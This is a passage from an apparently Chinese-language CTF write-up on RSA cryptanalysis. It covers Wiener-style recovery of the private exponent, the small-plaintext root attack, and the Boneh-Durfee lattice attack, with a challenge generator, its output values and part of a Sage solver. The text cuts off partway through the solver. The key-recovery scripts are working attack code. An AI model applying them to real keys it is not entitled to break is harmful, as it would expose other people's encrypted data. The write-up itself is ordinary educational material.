number">507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    e <span class="token operator">=</span> <span class="token number">77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    d<span class="token operator">=</span>hack_RSA<span class="token punctuation">(</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    c <span class="token operator">=</span> <span class="token number">165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    r<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    flag<span class="token operator">=</span>long_to_bytes<span class="token punctuation">(</span>r<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="34"></td><td><pre>main<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="小明文攻击"><a class="anchor" href="#小明文攻击">#</a> 小明文攻击</h3>
<p>在此补充一下小明文攻击，很容易被忽视的一种情况；</p>
<p>首先通过 RSA 最最基本的两个通式来说，当 n 过于大时我们是不是可以把 n 当作无穷大，也可以是看作 0</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi><mspace linebreak="newline"></mspace><mi>m</mi><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">c=m^e mod n\\m=c^dmodn
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">n</span></span></span></span></span></p>
<p>此时就变成了</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup></mrow><annotation encoding="application/x-tex">c=m^e
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span></span></span></span></span></p>
<p>这就好办啦，直接开根就好了！</p>
<h2 id="boneh_durfees-attack"><a class="anchor" href="#boneh_durfees-attack">#</a> Boneh_Durfee's Attack</h2>
<p>当维纳攻击解决不了大 e 问题时，就该考虑是不是 Boneh_Durfee's Attack 了。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python3</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> inverse</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">from</span> random <span class="token keyword">import</span> getrandbits</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">from</span> math <span class="token keyword">import</span> gcd</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>FLAG <span class="token operator">=</span> <span class="token string">b"crypto&#123;?????????????????????????????????????&#125;"</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_huge_RSA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    N <span class="token operator">=</span> p<span class="token operator">*</span>q</pre></td></tr><tr><td data-num="15"></td><td><pre>    phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        e <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">2046</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">if</span> gcd<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>d<span class="token punctuation">)</span><span class="token operator">**</span><span class="token number">4</span> <span class="token operator">></span> N<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                <span class="token keyword">break</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> N<span class="token punctuation">,</span>e</pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>N<span class="token punctuation">,</span> e <span class="token operator">=</span> get_huge_RSA<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> N<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'N = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'e = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'c = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>output:</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>N = 0x665166804cd78e8197073f65f58bca14e019982245fcc7cad74535e948a4e0258b2e919bf3720968a00e5240c5e1d6b8831d8fec300d969fccec6cce11dde826d3fbe0837194f2dc64194c78379440671563c6c75267f0286d779e6d91d3e9037c642a860a894d8c45b7ed564d341501cedf260d3019234f2964ccc6c56b6de8a4f66667e9672a03f6c29d95100cdf5cb363d66f2131823a953621680300ab3a2eb51c12999b6d4249dde499055584925399f3a8c7a4a5a21f095878e80bbc772f785d2cbf70a87c6b854eb566e1e1beb7d4ac6eb46023b3dc7fdf34529a40f5fc5797f9c15c54ed4cb018c072168e9c30ca3602e00ea4047d2e5686c6eb37b9</pre></td></tr><tr><td data-num="2"></td><td><pre>e = 0x2c998e57bc651fe4807443dbb3e794711ca22b473d7792a64b7a326538dc528a17c79c72e425bf29937e47b2d6f6330ee5c13bfd8564b50e49132d47befd0ee2e85f4bfe2c9452d62ef838d487c099b3d7c80f14e362b3d97ca4774f1e4e851d38a4a834b077ded3d40cd20ddc45d57581beaa7b4d299da9dec8a1f361c808637238fa368e07c7d08f5654c7b2f8a90d47857e9b9c0a81a46769f6307d5a4442707afb017959d9a681fa1dc8d97565e55f02df34b04a3d0a0bf98b7798d7084db4b3f6696fa139f83ada3dc70d0b4c57bf49f530dec938096071f9c4498fdef9641dfbfe516c985b27d1748cc6ce1a4beb1381fb165a3d14f61032e0f76f095d</pre></td></tr><tr><td data-num="3"></td><td><pre>c = 0x503d5dd3bf3d76918b868c0789c81b4a384184ddadef81142eabdcb78656632e54c9cb22ac2c41178607aa41adebdf89cd24ec1876365994f54f2b8fc492636b59382eb5094c46b5818cf8d9b42aed7e8051d7ca1537202d20ef945876e94f502e048ad71c7ad89200341f8071dc73c2cc1c7688494cad0110fca4854ee6a1ba999005a650062a5d55063693e8b018b08c4591946a3fc961dae2ba0c046f0848fbe5206d56767aae8812d55ee9decc1587cf5905887846cd3ecc6fc069e40d36b29ee48229c0c79eceab9a95b11d15421b8585a2576a63b9f09c56a4ca1729680410da237ac5b05850604e2af1f4ede9cf3928cbb3193a159e64482928b585ac</pre></td></tr></table></figure><p>附上 sage</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">############################################</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment"># Config</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">##########################################</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="9"></td><td><pre>Setting debug to true will display more informations</pre></td></tr><tr><td data-num="10"></td><td><pre>about the lattice, the bounds, the vectors...</pre></td></tr><tr><td data-num="11"></td><td><pre>"""</span></pre></td></tr><tr><td data-num="12"></td><td><pre>debug <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="15"></td><td><pre>Setting strict to true will stop the algorithm (and</pre></td></tr><tr><td data-num="16"></td><td><pre>return (-1, -1)) if we don't have a correct</pre></td></tr><tr><td data-num="17"></td><td><pre>upperbound on the determinant. Note that this</pre></td></tr><tr><td data-num="18"></td><td><pre>doesn't necesseraly mean that no solutions</pre></td></tr><tr><td data-num="19"></td><td><pre>will be found since the theoretical upperbound is</pre></td></tr><tr><td data-num="20"></td><td><pre>usualy far away from actual results. That is why</pre></td></tr><tr><td data-num="21"></td><td><pre>you should probably use `strict = False`</pre></td></tr><tr><td data-num="22"></td><td><pre>"""</span></pre></td></tr><tr><td data-num="23"></td><td><pre>strict <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token triple-quoted-string string">"""</pre></td></tr><tr><td data-num="26"></td><td><pre>This is experimental, but has provided remarkable results</pre></td></tr><tr><td data-num="27"></td><td><pre>so far. It tries to reduce the lattice as much as it can</pre></td></tr><tr><td data-num="28"></td><td><pre>while keeping its efficiency. I see no reason not to use</pre></td></tr><tr><td data-num="29"></td><td><pre>this option, but if things don't work, you should try</pre></td></tr><tr><td data-num="30"></td><td><pre>disabling it</pre></td></tr><tr><td data-num="31"></td><td><pre>"""</span></pre></td></tr><tr><td data-num="32"></td><td><pre>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="33"></td><td><pre>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment"># stop removing if lattice reaches that dimension</span></pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token comment">############################################</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token comment"># Functions</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">##########################################</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token comment"># display stats on helpful vectors</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    nothelpful <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="43"></td><td><pre>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="44"></td><td><pre>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token comment"># display matrix picture with 0 and X</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="51"></td><td><pre>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="53"></td><td><pre>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span></pre></td></tr><tr><td data-num="54"></td><td><pre>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="55"></td><td><pre>                a <span class="token operator">+=</span> <span class="token string">' '</span></pre></td></tr><tr><td data-num="56"></td><td><pre>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="57"></td><td><pre>            a <span class="token operator">+=</span> <span class="token string">'~'</span></pre></td></tr><tr><td data-num="58"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token comment"># tries to remove unhelpful vectors</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token comment"># we start at current = n-1 (last vector)</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token comment"># end of our recursive function</span></pre></td></tr><tr><td data-num="64"></td><td><pre>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="65"></td><td><pre>        <span class="token keyword">return</span> BB</pre></td></tr><tr><td data-num="66"></td><td><pre></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token comment"># we start by checking from the end</span></pre></td></tr><tr><td data-num="68"></td><td><pre>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="69"></td><td><pre>        <span class="token comment"># if it is unhelpful:</span></pre></td></tr><tr><td data-num="70"></td><td><pre>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="71"></td><td><pre>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="72"></td><td><pre>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="73"></td><td><pre>            <span class="token comment"># let's check if it affects other vectors</span></pre></td></tr><tr><td data-num="74"></td><td><pre>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="75"></td><td><pre>                <span class="token comment"># if another vector is affected:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>                <span class="token comment"># we increase the count</span></pre></td></tr><tr><td data-num="77"></td><td><pre>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="78"></td><td><pre>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="79"></td><td><pre>                    affected_vector_index <span class="token operator">=</span> jj</pre></td></tr><tr><td data-num="80"></td><td><pre></pre></td></tr><tr><td data-num="81"></td><td><pre>            <span class="token comment"># level:0</span></pre></td></tr><tr><td data-num="82"></td><td><pre>            <span class="token comment"># if no other vectors end up affected</span></pre></td></tr><tr><td data-num="83"></td><td><pre>            <span class="token comment"># we remove it</span></pre></td></tr><tr><td data-num="84"></td><td><pre>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="85"></td><td><pre>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="87"></td><td><pre>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="89"></td><td><pre>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="90"></td><td><pre>                <span class="token keyword">return</span> BB</pre></td></tr><tr><td data-num="91"></td><td><pre></pre></td></tr><tr><td data-num="92"></td><td><pre>            <span class="token comment"># level:1</span></pre></td></tr><tr><td data-num="93"></td><td><pre>            <span class="token comment"># if just one was affected we check</span></pre></td></tr><tr><td data-num="94"></td><td><pre>            <span class="token comment"># if it is affecting someone else</span></pre></td></tr><tr><td data-num="95"></td><td><pre>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="96"></td><td><pre>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="97"></td><td><pre>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="98"></td><td><pre>                    <span class="token comment"># if it is affecting even one vector</span></pre></td></tr><tr><td data-num="99"></td><td><pre>                    <span class="token comment"># we give up on this one</span></pre></td></tr><tr><td data-num="100"></td><td><pre>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="101"></td><td><pre>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="102"></td><td><pre>                <span class="token comment"># remove both it if no other vector was affected and</span></pre></td></tr><tr><td data-num="103"></td><td><pre>                <span class="token comment"># this helpful vector is not helpful enough</span></pre></td></tr><tr><td data-num="104"></td><td><pre>                <span class="token comment"># compared to our unhelpful one</span></pre></td></tr><tr><td data-num="105"></td><td><pre>                <span class="token keyword">if</span> affected_deeper <span class="token keyword">and</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="106"></td><td><pre>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="107"></td><td><pre>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span 